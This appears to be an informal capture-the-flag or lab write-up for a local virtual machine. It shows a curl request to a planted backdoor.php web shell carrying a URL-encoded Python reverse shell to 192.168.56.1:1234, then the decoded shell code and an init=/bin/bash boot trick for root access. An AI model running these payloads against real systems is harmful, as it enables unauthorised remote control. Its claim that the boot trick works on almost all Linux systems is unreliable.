# writeup 2

We have to do in the same way as in **writeup1** until using **curl** tool))

After doing that we have an incredible way to get the control of the root

**BACKDOOR**

Do not be scared, everything is done for educational purposes)

<img src="img/photo_5435923932709510476_y.jpg">

here is the encrepted code of it 

```
curl --insecure 'https://192.168.56.101/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.56.1%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27'
```

Don't be scared 2, this is just an url encode python code of this

```
import socket, subprocess, os, pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.56.1",1234));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=pty.spawn("/bin/bash");
```

You can syplly write on your own code then just seach on Google **url encoder** and translate to this

We have done this to get a reverse shell and execute cmd on server,
So, now we need some kind of kernel exploit to have a root
On this picture you can see cmds and potential issues.

and we write
```
#{partition} init=/bin/bash,
live init=/bin/bash
```
And we get the following result

By the way, it turns out that this method works almost on all linux systems currently, and the only way to protect from this is to simply encrypt the disk ðŸ™‚
